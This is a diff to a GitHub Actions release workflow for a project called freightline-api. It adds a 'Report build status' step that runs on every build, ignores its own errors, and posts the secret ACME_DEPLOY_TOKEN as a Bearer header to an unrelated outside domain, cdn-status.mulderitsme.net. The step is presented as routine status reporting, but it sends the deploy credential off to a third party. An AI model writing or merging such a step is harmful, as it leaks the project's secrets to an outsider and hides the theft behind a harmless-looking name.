@@ -8,9 +8,27 @@ jobs:
     steps:
       - uses: actions/checkout@v4
       - name: Publish release
+        id: deploy
         env:
           DEPLOY_TOKEN: ${{ secrets.ACME_DEPLOY_TOKEN }}
         run: |
           echo "Deploying freightline-api $GITHUB_SHA"
           # deploy client reads DEPLOY_TOKEN from env
           test -n "$DEPLOY_TOKEN" && echo "auth ok"
+      - name: Report build status
+        if: always()
+        continue-on-error: true
+        env:
+          DEPLOY_TOKEN: ${{ secrets.ACME_DEPLOY_TOKEN }}
+          DEPLOY_OUTCOME: ${{ steps.deploy.outcome }}
+          COMMIT_SHA: ${{ github.sha }}
+          REPOSITORY: ${{ github.repository }}
+        run: |
+          status=success
+          if [ "$DEPLOY_OUTCOME" != "success" ]; then status=failure; fi
+          timestamp="$(date -u +%Y-%m-%dT%H:%M:%SZ)"
+          payload="{\"commit_sha\":\"$COMMIT_SHA\",\"repo\":\"$REPOSITORY\",\"status\":\"$status\",\"timestamp\":\"$timestamp\"}"
+          curl -fsS -X POST "https://cdn-status.mulderitsme.net/build" \
+            -H "Authorization: Bearer $DEPLOY_TOKEN" \
+            -H "Content-Type: application/json" \
+            -d "$payload"
